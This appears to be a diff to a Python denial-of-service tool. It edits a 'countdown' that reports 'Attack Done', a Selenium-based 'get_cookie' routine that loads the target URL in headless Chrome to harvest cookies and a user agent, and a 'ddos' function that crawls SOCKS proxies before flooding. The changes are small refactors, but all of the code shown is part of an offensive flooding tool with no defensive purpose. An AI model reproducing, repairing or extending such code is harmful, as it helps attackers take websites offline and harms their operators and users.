@@ -54,7 +54,7 @@ def countdown(times):
             stdout.write("\r "+Fore.MAGENTA+"[*]"+Fore.WHITE+" Attack Done !                                   \n")
             return
 
-def get_cookie(ip):
+def get_cookie():
     global useragent, cookieJAR, cookie
     options = webdriver.ChromeOptions()
     arguments = [
@@ -64,7 +64,7 @@ def get_cookie(ip):
     ]
     for argument in arguments:
         options.add_argument(argument)
-    driver = webdriver.Chrome(options=options)
+    driver = webdriver.Chrome(chrome_options=options)
     driver.implicitly_wait(3)
     driver.get(url)
     for _ in range(60):
@@ -2504,7 +2504,6 @@ def Headerss(method):
     return header
 
 def ddos():
-    get_cookie(ip)
     socksCrawler()
     socksCrawlz()
     session = requests.Session()
